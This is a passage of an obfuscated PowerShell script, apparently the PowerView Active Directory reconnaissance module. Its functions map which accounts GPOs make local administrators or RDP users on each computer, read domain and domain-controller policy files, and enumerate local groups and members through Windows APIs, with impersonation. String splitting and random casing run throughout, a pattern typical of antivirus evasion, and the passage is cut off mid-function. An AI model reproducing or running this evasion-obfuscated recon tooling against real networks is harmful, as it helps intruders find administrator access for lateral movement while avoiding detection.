                    ${gpolO`caLGrO`UPm`AP`P`ing}."pSO`BJECt"."tYPE`Na`meS".("{0}{1}" -f'Ad','d').Invoke(("{3}{4}{8}{1}{7}{2}{6}{0}{5}" -f'u','w','Local','Powe','r','pMapping','Gro','.GPO','Vie'))
                    ${GP`OL`OcAlGroU`pma`PpIng}
                }
            }
        }
    }
}


function get-DomAi`N`Gp`oCoM`PU`TE`RLO`CaLgRoup`Map`p`Ing {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}" -f 'P','s','SShouldP','roces'}, '')]
    [OutputType({"{5}{1}{3}{0}{4}{6}{2}" -f'e','View.GGP','ber','OComput','rLocal','Power','GroupMem'})]
    [CmdletBinding(DEfAultPAramETErSEtName = {"{3}{2}{0}{1}{4}"-f 'e','n','mputerId','Co','tity'})]
    Param(
        [Parameter(POSItIoN = 0, ParametErseTnAmE = "c`o`MPU`TEriDe`NtITY", maNdaTOrY = ${t`Rue}, valUeFRoMpIpelINe = ${t`Rue}, vaLuEfrOmPipELinEBYPrOPERTYnAmE = ${tR`Ue})]
        [Alias({"{0}{2}{3}{1}" -f 'Co','Name','mput','er'}, {"{2}{1}{0}" -f 'er','put','Com'}, {"{2}{0}{1}{3}"-f'isti','nguishedN','D','ame'}, {"{0}{2}{1}{3}"-f'SamAccount','m','Na','e'}, {"{0}{1}"-f'Nam','e'})]
        [String]
        ${cO`mpUTER`IdE`NtITy},

        [Parameter(maNDAtory = ${Tr`Ue}, paRAmEtErsetnAmE = "o`UId`E`NtiTy")]
        [Alias('OU')]
        [String]
        ${oUIden`T`iTY},

        [String]
        [ValidateSet({"{2}{1}{3}{4}{0}" -f 'rs','ist','Admin','ra','to'}, {"{0}{2}{1}" -f 'S','44','-1-5-32-5'}, 'RDP', {"{4}{1}{0}{3}{2}" -f'ote ','em','p Users','Deskto','R'}, {"{0}{3}{2}{1}" -f'S-1-','5','-55','5-32'})]
        ${L`oCaLgrO`UP} = ("{1}{4}{2}{3}{0}" -f's','Admi','ato','r','nistr'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`Ma`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'Path','ADS'})]
        [String]
        ${SEA`R`ChbAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}" -f'lle','r','nContro','Domai'})]
        [String]
        ${Se`R`VEr},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{1}{0}"-f'evel','OneL'}, {"{0}{1}" -f 'Sub','tree'})]
        [String]
        ${sE`ArCh`SCope} = ("{0}{1}"-f 'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`U`lt`PageSIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ERvER`TIMeLim`iT},

        [Switch]
        ${TOmbS`T`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`d`EntIaL} =   (  &("{2}{3}{1}{0}" -f 'BLe','A','GET-vA','RI') ("Jh3x"+"o6")  -vALUEonl )::"eMp`Ty"
    )

    BEGIN {
        ${Co`mMOn`ArguMeN`Ts} = @{}
        if (${PSbO`UNdP`ARAm`eTeRs}[("{0}{1}"-f 'Domai','n')]) { ${CO`M`MONarGUmEN`TS}[("{1}{0}" -f'in','Doma')] = ${DO`MAiN} }
        if (${PSBou`Ndpa`RA`M`ETErS}[("{1}{0}" -f'rver','Se')]) { ${C`O`mM`onaRgU`mENTs}[("{1}{0}"-f 'r','Serve')] = ${SEr`V`eR} }
        if (${psb`Ou`Ndpa`RamET`Ers}[("{0}{2}{1}"-f 'Sea','pe','rchSco')]) { ${cOM`m`ON`Arg`UMENts}[("{0}{2}{1}" -f'Sea','hScope','rc')] = ${S`ea`Rchsc`oPe} }
        if (${PS`BouNDPArA`MeTE`Rs}[("{3}{2}{1}{0}"-f'e','tPageSiz','l','Resu')]) { ${cOmmoN`Ar`G`UmeN`TS}[("{2}{1}{3}{4}{0}" -f 'ize','Pa','Result','g','eS')] = ${R`EsUltp`A`GES`iZE} }
        if (${pSb`o`UND`p`ARaMEt`ErS}[("{1}{3}{4}{2}{0}" -f'Limit','S','ime','er','verT')]) { ${Co`MMOnARGU`m`E`Nts}[("{1}{3}{0}{2}"-f'i','Serv','mit','erTimeL')] = ${s`ERvertIm`EL`IMIt} }
        if (${PsboU`Nd`P`Ar`AmeTErs}[("{1}{2}{0}" -f 'bstone','T','om')]) { ${COM`MOnARguMe`N`Ts}[("{2}{1}{0}"-f 'e','on','Tombst')] = ${to`MbS`TonE} }
        if (${PSbOu`Ndp`AR`AmET`ERS}[("{2}{1}{0}"-f'tial','n','Crede')]) { ${C`oMmoNarg`U`mEnts}[("{1}{0}{2}" -f'rede','C','ntial')] = ${cred`ent`Ial} }
    }

    PROCESS {
        if (${P`sbO`Und`p`ArAMETe`Rs}[("{2}{4}{3}{0}{1}" -f 'Iden','tity','Com','ter','pu')]) {
            ${cOMP`UTe`RS} = &("{3}{0}{1}{4}{2}" -f'o','ma','ter','Get-D','inCompu') @CommonArguments -Identity ${co`MpU`T`erIdEnt`ITY} -Properties ("{6}{3}{4}{2}{5}{1}{0}" -f 'ame','nshostn','uishedna','i','ng','me,d','dist')

            if (-not ${Co`M`pu`TERs}) {
                throw ('[Get'+'-Doma'+'inGPOC'+'omputerLocal'+'Gro'+'u'+'pMapping] '+'Comp'+'ute'+'r '+"$ComputerIdentity "+'n'+'ot '+'fou'+'n'+'d. '+'T'+'ry '+'a '+'ful'+'ly'+' '+'qua'+'li'+'fie'+'d '+'ho'+'st '+'name'+'.')
            }

            ForEach (${co`m`pUTeR} in ${cOmp`UT`ERS}) {

                ${gPoGUi`DS} = @()

                
                ${dn} = ${com`PuTEr}."Di`s`TInGUi`SHE`D`NamE"
                ${Oui`NDEX} = ${D`N}.("{0}{1}"-f'Inde','xOf').Invoke('OU=')
                if (${oU`iN`deX} -gt 0) {
                    ${O`Una`ME} = ${dn}.("{2}{1}{0}"-f'bString','u','S').Invoke(${o`UIN`dex})
                }
                if (${o`Un`AmE}) {
                    ${Gp`O`guiDS} += &("{0}{2}{1}{3}" -f 'Get','ma','-Do','inOU') @CommonArguments -SearchBase ${oU`NamE} -LDAPFilter ("{0}{1}{2}"-f '(','gplin','k=*)') | &("{1}{2}{4}{0}{3}" -f'h-Obje','F','orEa','ct','c') {
                        &("{3}{0}{1}{2}" -f 'lect-','Str','ing','Se') -InputObject ${_}."Gpl`i`Nk" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{2}{0}{1}"-f 'jec','t','ForEach-Ob') {${_}."M`A`TCHeS" | &("{2}{1}{3}{0}"-f 'ct','ct-Ob','Sele','je') -ExpandProperty ("{0}{1}"-f'Va','lue') }
                    }
                }

                
                &("{2}{0}{4}{1}{3}" -f'i','s','Wr','e','te-Verbo') "Enumerating the sitename for: $($Computer.dnshostname) "
                ${coM`P`UTE`Rs`iTe} = (&("{3}{6}{1}{5}{2}{4}{0}{7}" -f'teNa','-Net','ompute','G','rSi','C','et','me') -ComputerName ${COM`PuT`eR}."dNSH`os`TnaMe")."SIt`eNA`mE"
                if (${c`oMPu`Te`RSItE} -and (${ComPuTE`RS`ITe} -notmatch ("{0}{1}" -f 'Err','or'))) {
                    ${GPogU`iDS} += &("{2}{0}{1}{3}"-f't-Do','ma','Ge','inSite') @CommonArguments -Identity ${CO`MpuTe`RsitE} -LDAPFilter ("{0}{1}{2}{3}" -f '(','gp','link','=*)') | &("{4}{1}{3}{0}{2}"-f 'h-','orEa','Object','c','F') {
                        &("{0}{1}{2}" -f 'Sele','ct-','String') -InputObject ${_}."gplI`NK" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{2}{1}{0}"-f 't','ach-Objec','ForE') {${_}."Ma`TcH`eS" | &("{3}{2}{1}{0}{4}" -f'c','e','ect-Obj','Sel','t') -ExpandProperty ("{0}{1}" -f'Va','lue') }
                    }
                }

                
                ${Gpo`gu`I`ds} | &("{1}{0}{3}{2}"-f'ain','Get-Dom','roup','GPOLocalG') @CommonArguments | &("{2}{3}{0}{1}" -f 'b','ject','So','rt-O') -Property ("{0}{2}{1}" -f'G','e','PONam') -Unique | &("{2}{1}{0}{3}"-f 'h-Objec','Eac','For','t') {
                    ${GP`o`group} = ${_}

                    if(${Gp`O`GrOUp}."Gr`o`UPMeM`BerS") {
                        ${GpO`MEm`B`eRS} = ${g`pOGr`Oup}."gRo`UpME`Mbe`RS"
                    }
                    else {
                        ${gPOmE`M`Be`Rs} = ${G`PoGRo`Up}."g`Rou`pSid"
                    }

                    ${G`poMEm`BERs} | &("{1}{0}{2}" -f 'Each-Obj','For','ect') {
                        ${o`B`JECt} = &("{3}{0}{1}{4}{2}" -f'-Dom','ai','ject','Get','nOb') @CommonArguments -Identity ${_}
                        ${i`SGrO`UP} = @(("{0}{2}{1}" -f '268','6','43545'),("{1}{0}{2}" -f '8','26','435457'),("{0}{3}{1}{2}" -f'536','09','12','87'),("{1}{0}{2}" -f '7091','5368','3')) -contains ${ObjE`Ct}."sAm`AccouNTT`Y`PE"

                        ${GP`oCompUT`erl`ocAlGR`OuP`meMB`eR} = &("{2}{1}{0}"-f 't','bjec','New-O') ("{1}{2}{0}" -f 'bject','PS','O')
                        ${GPocoM`PUTe`RL`OCalGROU`PmemB`er} | &("{2}{0}{1}"-f'd','-Member','Ad') ("{2}{3}{1}{0}"-f 'operty','epr','N','ot') ("{2}{1}{0}"-f'terName','ompu','C') ${C`OmpU`TeR}."DN`SH`OSt`NamE"
                        ${GpOcomPuTerlOca`l`g`R`OupMe`mB`er} | &("{0}{2}{1}"-f'A','er','dd-Memb') ("{0}{2}{1}"-f'Noteprop','ty','er') ("{0}{2}{1}"-f'O','Name','bject') ${oBj`e`cT}."sAmacC`O`U`NTname"
                        ${gPOCOm`PUt`e`RL`OCaLGrOU`pm`emBer} | &("{2}{0}{1}"-f 'mb','er','Add-Me') ("{0}{2}{3}{1}" -f'Notepr','erty','o','p') ("{1}{2}{0}"-f'DN','Obj','ect') ${OBJe`CT}."d`ist`inG`U`isHeDNa`ME"
                        ${gpOcomPuTE`R`L`ocA`LGRouPM`em`Ber} | &("{2}{1}{0}"-f 'mber','d-Me','Ad') ("{1}{2}{0}" -f'perty','Notep','ro') ("{1}{0}{2}"-f 'bj','O','ectSID') ${_}
                        ${GpOC`oMp`U`TeRloCAlGr`Ou`P`MeMbeR} | &("{0}{1}{2}"-f'Add-M','embe','r') ("{2}{1}{3}{0}" -f'operty','t','No','epr') ("{0}{1}{2}"-f 'Is','Grou','p') ${i`sgro`UP}
                        ${GpO`C`OmP`UtErLoC`AlgR`oUPmEmB`Er} | &("{1}{2}{0}"-f'er','A','dd-Memb') ("{0}{3}{2}{1}" -f'N','ty','proper','ote') ("{2}{1}{0}{3}{4}"-f 'spla','PODi','G','yN','ame') ${GPO`Group}."G`PodiS`pLAy`NamE"
                        ${Gpo`co`mPUtErlOcA`L`gr`o`U`pmEm`BeR} | &("{1}{3}{0}{2}" -f 'e','Add-M','r','emb') ("{0}{2}{3}{1}"-f 'No','property','t','e') ("{1}{2}{0}" -f'OGuid','G','P') ${GPogr`Oup}."gp`O`NAMe"
                        ${GP`OCOMP`UtE`R`l`OCALGROuPme`m`B`ER} | &("{0}{3}{1}{2}" -f 'A','e','mber','dd-M') ("{3}{0}{1}{2}" -f'ep','r','operty','Not') ("{2}{0}{1}"-f'OPat','h','GP') ${G`PoGrO`UP}."GpoPa`Th"
                        ${GpocoMputeRl`oC`AlG`Ro`UpmE`mb`er} | &("{2}{1}{0}"-f'r','-Membe','Add') ("{2}{3}{0}{1}" -f'epro','perty','No','t') ("{1}{0}" -f 'pe','GPOTy') ${G`Po`gRoUP}."gpot`YPE"
                        ${gPoCO`MP`U`TerLocAlGrOup`m`e`Mb`eR}."PS`ObJ`ect"."tY`PENAm`es".("{0}{1}"-f 'A','dd').Invoke(("{0}{5}{7}{4}{6}{1}{3}{2}"-f'PowerV','o','ember','calGroupM','om','iew.','puterL','GPOC'))
                        ${GpoC`Om`PUte`RLO`CaLgR`oUP`M`EMBER}
                    }
                }
            }
        }
    }
}


function geT-dO`Ma`INPoLiCYda`TA {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}" -f'c','ShouldPro','ess','PS'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItIon = 0, vaLuEfrOmpiPeLINE = ${tr`UE}, valUEfROMpIPELinEBYpROPERTYnAmE = ${T`Rue})]
        [Alias({"{0}{2}{1}"-f 'S','rce','ou'}, {"{0}{1}" -f'Nam','e'})]
        [String]
        ${p`OliCY} = ("{1}{0}"-f'omain','D'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{2}{1}{3}" -f 'Domai','ont','C','roller','n'})]
        [String]
        ${sERv`er},

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVE`Rt`Imeli`m`It},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`dentI`AL} =  (&("{3}{2}{1}{0}"-f 'bLe','Ia','r','geT-va')  ('JH3'+'XO'+'6')  )."V`Alue"::"E`MptY"
    )

    BEGIN {
        ${s`e`ArchERaRGum`ENTs} = @{}
        if (${p`sB`OUNdpARamEt`ERs}[("{1}{0}" -f 'rver','Se')]) { ${SeArC`hERA`RGU`meNtS}[("{0}{1}" -f'S','erver')] = ${S`ER`VER} }
        if (${pS`BOuNdP`ArAm`Ete`RS}[("{0}{1}{2}{3}" -f'S','er','ve','rTimeLimit')]) { ${sEa`RCH`EraR`gumeNtS}[("{2}{3}{0}{1}"-f 'mi','t','Serve','rTimeLi')] = ${se`RvE`RtiM`EL`IMit} }
        if (${psboU`N`dP`ArA`me`TERs}[("{3}{0}{1}{2}"-f'r','ede','ntial','C')]) { ${s`eARchERa`R`GU`M`eNtS}[("{0}{1}{2}{3}" -f'C','red','ent','ial')] = ${cREDent`i`AL} }

        ${Co`N`VErt`A`RGUmeN`TS} = @{}
        if (${pSboun`DpArAM`et`ERs}[("{0}{1}"-f'Serve','r')]) { ${c`OnvERT`ARguM`ENtS}[("{2}{1}{0}" -f 'r','erve','S')] = ${S`ER`Ver} }
        if (${PsBoU`Ndp`Ar`A`mE`TERs}[("{0}{2}{1}" -f'Cr','ntial','ede')]) { ${CO`NVer`TA`R`gumEn`TS}[("{1}{0}{2}" -f'a','Credenti','l')] = ${CReD`EnT`IAL} }
    }

    PROCESS {
        if (${Ps`BOu`NDPAr`AmeTers}[("{1}{0}"-f'main','Do')]) {
            ${S`earc`heR`Arg`UmENts}[("{1}{0}" -f'in','Doma')] = ${d`Omain}
            ${c`OnvertA`Rgu`MEN`TS}[("{1}{0}"-f'in','Doma')] = ${dOM`Ain}
        }

        if (${pOl`icy} -eq 'All') {
            ${sE`ARCHEra`RGuME`NTs}[("{2}{0}{1}" -f 'dent','ity','I')] = '*'
        }
        elseif (${p`OL`icY} -eq ("{0}{1}" -f 'D','omain')) {
            ${sEAR`chEra`RgumE`N`Ts}[("{1}{0}" -f'y','Identit')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${Pol`ICy} -eq ("{4}{3}{2}{1}{0}{5}" -f 'rolle','ont','C','ain','Dom','r')) -or (${pOL`i`cY} -eq 'DC')) {
            ${s`eA`RC`HeRaRGuMeN`TS}[("{0}{1}" -f 'Identi','ty')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${s`e`ARcHEr`ARgumenTS}[("{2}{0}{1}" -f'd','entity','I')] = ${p`OL`icy}
        }

        ${GpoR`E`SuLts} = &("{0}{2}{1}{3}"-f 'Get','in','-Doma','GPO') @SearcherArguments

        ForEach (${g`pO} in ${gpOr`esu`lts}) {
            
            ${gpTt`mP`lpAth} = ${g`Po}."g`P`CfILESYspath" + ((("{7}{9}{6}{5}{4}{2}{3}{0}{1}{8}" -f '{0','}',' NT{0}','SecEdit','s','indow','{0}W','{0}MACHINE{0}Mi','GptTmpl.inf','crosoft'))-f [CHAr]92)

            ${PAR`s`EA`RGS} =  @{
                ("{1}{0}{2}" -f 'mpl','GptT','Path') = ${Gpt`TMpLPA`TH}
                ("{3}{1}{2}{0}" -f 't','t','Objec','Outpu') = ${Tr`Ue}
            }
            if (${PsB`ouNdP`A`R`AmET`ERS}[("{1}{2}{0}"-f 'l','C','redentia')]) { ${p`ARs`eArgS}[("{1}{2}{0}{3}" -f't','C','reden','ial')] = ${cr`Eden`TIAL} }

            
            &("{2}{0}{3}{1}" -f '-GptT','pl','Get','m') @ParseArgs | &("{1}{2}{0}"-f 't','ForEach-O','bjec') {
                ${_} | &("{1}{2}{0}"-f 'ber','Add-','Mem') ("{2}{3}{1}{0}" -f 'property','te','N','o') ("{0}{1}{2}"-f 'GPO','Na','me') ${g`Po}."n`AME"
                ${_} | &("{2}{1}{0}"-f 'ember','dd-M','A') ("{0}{2}{1}" -f 'N','teproperty','o') ("{1}{0}{3}{2}"-f 'O','GP','ayName','Displ') ${G`po}."dI`SPLaY`N`AMe"
                ${_}
            }
        }
    }
}










function g`Et-`NETLO`CAl`Gr`OUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{0}{1}{2}"-f'dPro','ces','s','l','PSShou'}, '')]
    [OutputType({"{3}{5}{0}{2}{1}{6}{4}"-f 'lG','u','ro','PowerView','API','.Loca','p.'})]
    [OutputType({"{4}{1}{0}{3}{2}"-f'roup.W','lG','NT','in','PowerView.Loca'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTiOn = 0, valUEfRoMPIpeLine = ${tR`Ue}, VaLuEFrOMPiPeLINEbyproPertYnAMe = ${t`RuE})]
        [Alias({"{0}{1}"-f 'HostN','ame'}, {"{0}{2}{1}" -f 'd','hostname','ns'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`oMp`UtE`RN`AMe} = ${enV:cOMput`er`N`AmE},

        [ValidateSet('API', {"{1}{0}" -f 'T','WinN'})]
        [Alias({"{4}{3}{1}{0}{2}"-f 'n','io','Method','ect','Coll'})]
        [String]
        ${MeT`Hod} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`dEN`Tial} =   ${J`H3`Xo6}::"EmP`TY"
    )

    BEGIN {
        if (${ps`BOuNdpaRA`mET`erS}[("{0}{1}{2}{3}" -f'Cred','enti','a','l')]) {
            ${lOG`onT`Ok`En} = &("{0}{1}{2}{3}{4}" -f'Inv','ok','e-User','Imperson','ation') -Credential ${cREDe`NtI`AL}
        }
    }

    PROCESS {
        ForEach (${COMPu`T`eR} in ${c`oMP`UteRN`AMe}) {
            if (${metH`OD} -eq 'API') {
                

                
                ${qU`er`Yl`EVel} = 1
                ${PTr`In`FO} =   ${9R`ZQ}::"Ze`Ro"
                ${ENtR`IEsR`eAd} = 0
                ${t`OtalRE`Ad} = 0
                ${resu`MehAnd`LE} = 0

                
                ${r`eSULt} = ${n`ETAP`I32}::"ne`Tl`OCaLGrOu`peNuM"(${CO`mPu`Ter}, ${Q`UerYLE`VEL}, [ref]${p`T`RinFo}, -1, [ref]${eNT`R`IES`REAd}, [ref]${T`oTaL`R`eAD}, [ref]${rES`UMEh`And`lE})

                
                ${oF`Fs`Et} = ${ptR`in`Fo}.("{0}{2}{1}" -f'T','64','oInt').Invoke()

                
                if ((${Re`sult} -eq 0) -and (${OFFs`et} -gt 0)) {

                    
                    ${I`N`Cr`EmEnt} = ${loCa`lgr`O`UP_InFO_1}::("{1}{0}" -f'Size','Get').Invoke()

                    
                    for (${I} = 0; (${i} -lt ${Ent`Ri`EsR`eaD}); ${I}++) {
                        
                        ${NEwi`NTp`TR} = &("{0}{1}{3}{2}" -f 'New-O','bj','ct','e') ("{2}{0}{1}"-f'stem.Intpt','r','Sy') -ArgumentList ${oFfs`Et}
                        ${In`FO} = ${N`EWiNtp`Tr} -as ${l`OCaLG`RoU`p_inFo_1}

                        ${O`FFs`ET} = ${NE`wi`NTptr}.("{0}{1}" -f 'ToInt6','4').Invoke()
                        ${o`F`FsEt} += ${iNcre`m`ent}

                        ${L`O`cal`GroUp} = &("{3}{1}{2}{0}"-f 'ct','w-','Obje','Ne') ("{1}{0}" -f 'ct','PSObje')
                        ${L`oca`L`gRoup} | &("{1}{0}{2}{3}"-f'dd-M','A','emb','er') ("{2}{1}{0}{3}"-f 'per','epro','Not','ty') ("{3}{0}{2}{1}" -f'puterN','me','a','Com') ${COmp`U`Ter}
                        ${LoCAL`g`R`oUp} | &("{2}{1}{0}"-f 'er','Memb','Add-') ("{3}{2}{1}{0}"-f 'ty','er','rop','Notep') ("{1}{2}{0}" -f 'Name','Grou','p') ${in`FO}."L`Grp`i1_NAme"
                        ${lO`Ca`lg`RouP} | &("{3}{0}{2}{1}" -f'd-Mem','er','b','Ad') ("{1}{0}{2}" -f 'er','Noteprop','ty') ("{0}{1}{2}"-f'Co','mm','ent') ${IN`FO}."LGrPI`1_Comm`ent"
                        ${l`OcA`lgrOuP}."PSOBJ`eCT"."Ty`PENa`MeS".("{1}{0}"-f'ert','Ins').Invoke(0, ("{2}{3}{0}{5}{4}{7}{1}{6}"-f 'w','G','P','owerVie','Lo','.','roup.API','cal'))
                        ${LO`CAlg`ROUp}
                    }
                    
                    ${N`UlL} = ${n`eTapI32}::("{3}{0}{2}{1}" -f'piB','ree','ufferF','NetA').Invoke(${PTrI`NfO})
                }
                else {
                    &("{0}{1}{2}"-f 'W','rit','e-Verbose') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                ${co`Mp`U`T`erProvId`er} = [ADSI]"WinNT://$Computer,computer"

                ${C`omP`U`TERPrO`Vi`der}."pSB`Ase"."c`hi`LDren" | &("{0}{1}{2}" -f'W','here','-Object') { ${_}."p`s`BAsE"."sc`hEMAcl`AsSN`AMe" -eq ("{0}{1}"-f 'g','roup') } | &("{4}{1}{3}{0}{2}"-f'h-Obj','orE','ect','ac','F') {
                    ${L`ocalgr`OUp} = ([ADSI]${_})
                    ${g`R`oUP} = &("{1}{2}{0}" -f 'ct','Ne','w-Obje') ("{1}{0}" -f 't','PSObjec')
                    ${grO`Up} | &("{1}{0}{2}{3}"-f 'dd','A','-Me','mber') ("{3}{0}{1}{2}"-f'p','er','ty','Notepro') ("{1}{0}{2}"-f 'p','Com','uterName') ${cOmPu`T`Er}
                    ${gRO`Up} | &("{2}{0}{1}" -f'mb','er','Add-Me') ("{2}{1}{0}" -f'operty','tepr','No') ("{1}{2}{0}"-f 'me','G','roupNa') (${l`Oca`lgroup}.("{0}{1}{2}" -f 'In','voke','Get').Invoke(("{1}{0}"-f 'e','Nam')))
                    ${G`RoUp} | &("{2}{1}{0}" -f 'r','-Membe','Add') ("{0}{1}{2}"-f'Not','eproper','ty') 'SID' ((&("{2}{1}{3}{0}"-f'ject','O','New-','b') ("{1}{0}{7}{3}{6}{4}{5}{8}{9}{2}{11}{10}" -f 'yste','S','u','.P','i','p','rinc','m.Security','al','.Sec','entifier','rityId')(${LOc`Algr`O`Up}.("{0}{1}{2}" -f 'I','nvok','eGet').Invoke(("{2}{0}{1}"-f 'ctsi','d','obje')),0))."Va`Lue")
                    ${gR`oUP} | &("{2}{1}{0}" -f'ember','d-M','Ad') ("{1}{0}{3}{2}" -f 'epr','Not','y','opert') ("{1}{0}"-f'nt','Comme') (${L`oCa`Lg`ROUP}.("{1}{0}"-f'vokeGet','In').Invoke(("{0}{1}{2}" -f 'Descr','ipt','ion')))
                    ${Gr`oUP}."p`So`BjECt"."Ty`pENa`mes".("{1}{0}"-f'ert','Ins').Invoke(0, ("{7}{3}{1}{4}{5}{0}{6}{2}"-f'oup.W','rView.Lo','NT','owe','c','alGr','in','P'))
                    ${g`RO`UP}
                }
            }
        }
    }
    
    END {
        if (${LoGO`N`TOKEn}) {
            &("{0}{3}{1}{2}{4}" -f 'In','e-Re','v','vok','ertToSelf') -TokenHandle ${l`OgO`N`TOKen}
        }
    }
}


function gET-`N`eTLO`CalGroUpMe`Mber {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}"-f'uldPr','ocess','PSSh','o'}, '')]
    [OutputType({"{5}{0}{2}{4}{3}{1}" -f 'al','r.API','GroupMe','e','mb','PowerView.Loc'})]
    [OutputType({"{3}{6}{8}{4}{0}{7}{9}{1}{2}{5}" -f 'Lo','oupMembe','r.Wi','P','ew.','nNT','ow','c','erVi','alGr'})]
    Param(
        [Parameter(pOSitIon = 0, VAlUEfROmPIPeliNe = ${Tr`UE}, VALUefRomPIPeLINEBYPRopERtyNAME = ${tr`UE})]
        [Alias({"{1}{0}{2}"-f 's','Ho','tName'}, {"{0}{2}{1}"-f 'dnsho','e','stnam'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`o`MP`UtERName} = ${ENV:COM`put`eR`N`AMe},

        [Parameter(valuEfrOMPipelINeByProPERtYNAMe = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${gR`Oupna`mE} = ("{1}{0}{2}"-f'nist','Admi','rators'),

        [ValidateSet('API', {"{1}{0}"-f'T','WinN'})]
        [Alias({"{2}{0}{1}{3}"-f'lecti','onMe','Col','thod'})]
        [String]
        ${m`eT`hoD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RedEnTi`AL} =  (  &("{0}{1}{2}"-f'gEt-','variAB','lE')  ('JH'+'3Xo6') -VaL )::"EM`PTy"
    )

    BEGIN {
        if (${P`sBoUN`DpA`RaMETErs}[("{0}{1}{2}" -f'C','red','ential')]) {
            ${lOG`ONto`KeN} = &("{3}{4}{0}{5}{6}{2}{1}" -f'rI','ion','t','Inv','oke-Use','mpe','rsona') -Credential ${c`ReDE`NT`iAl}
        }
    }

    PROCESS {
        ForEach (${COm`puT`eR} in ${COmpUtEr`Na`mE}) {
            if (${mETh`oD} -eq 'API') {
                

                
                ${qUERYle`V`eL} = 2
                ${pTr`iNFO} =   (  &("{2}{1}{0}{4}{3}"-f'i','lD','gET-chI','EM','T')  ("{1}{3}{2}{0}"-f'q','VArIaBl','Z','e:9R'))."V`ALUe"::"ZE`RO"
                ${e`NTRieSR`Ead} = 0
                ${t`oTAlr`e`AD} = 0
                ${Re`s`UMehandLE} = 0

                
                ${REs`U`Lt} = ${N`ETAp`i32}::"Netl`ocalGrouP`g`eTm`EMBeRS"(${coM`PU`Ter}, ${gr`ou`pN`AMe}, ${qUe`RY`LeV`el}, [ref]${pt`RI`NFO}, -1, [ref]${e`NTri`E`srEAd}, [ref]${tOt`AL`READ}, [ref]${R`E`SumEHa`NdLE})

                
                ${OF`FS`ET} = ${PTr`inFO}.("{2}{0}{1}"-f't','64','ToIn').Invoke()

                ${ME`MberS} = @()

                
                if ((${REs`U`Lt} -eq 0) -and (${OF`Fset} -gt 0)) {

                    
                    ${I`NcReMe`NT} = ${LoCa`l`gR`ou`p`_mEmbeRS_Info_2}::("{0}{1}{2}" -f'Ge','tSiz','e').Invoke()

                    
                    for (${I} = 0; (${I} -lt ${E`Nt`Ri`ESREAd}); ${i}++) {
                        
                        ${n`e`WiNtptr} = &("{0}{1}{2}" -f'Ne','w-Ob','ject') ("{1}{3}{0}{2}" -f '.Intp','Sys','tr','tem') -ArgumentList ${oFf`SEt}
                        ${I`NFO} = ${N`E`w`INtpTr} -as ${LocA`LGrOU`P_`mEmB`eRs_I`NFo`_2}

                        ${offs`ET} = ${N`eW`IntpTr}.("{0}{1}{2}" -f 'ToIn','t6','4').Invoke()
                        ${O`F`FSET} += ${IN`c`RE`menT}

                        ${s`I`dsTRInG} = ''
                        ${R`e`sUlt2} = ${adv`A`pi32}::"C`oN`VER`TsiD`TOSTrIngsId"(${in`FO}."L`GrmI2_`SiD", [ref]${S`Id`strInG});${lasTe`R`R`or} =  (  &("{1}{0}"-f'i','gc')  ('vaRi'+'A'+'B'+'lE:XZ'+'Nls')  )."vA`lUE"::("{1}{0}{3}{2}"-f'tLa','Ge','2Error','stWin3').Invoke()

                        if (${rE`sU`lT2} -eq 0) {
                            &("{2}{4}{0}{3}{1}"-f 'e-V','rbose','Wr','e','it') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            ${M`Emb`Er} = &("{0}{1}{3}{2}"-f'New-Ob','j','t','ec') ("{1}{0}"-f 't','PSObjec')
                            ${mE`M`BER} | &("{2}{0}{1}"-f 'dd-M','ember','A') ("{0}{3}{2}{1}"-f'Note','rty','rope','p') ("{1}{2}{0}" -f 'e','Com','puterNam') ${CO`mput`Er}
                            ${MEMb`ER} | &("{2}{1}{0}"-f'er','mb','Add-Me') ("{2}{3}{0}{1}" -f't','y','Notepro','per') ("{1}{2}{0}" -f'me','GroupN','a') ${gRO`Upn`Ame}
                            ${M`eMB`ER} | &("{0}{2}{1}" -f 'Add-','r','Membe') ("{1}{2}{0}" -f'ty','No','teproper') ("{2}{1}{0}" -f'ame','mberN','Me') ${In`Fo}."LG`RMi2_DOMaI`Na`N`d`NAME"
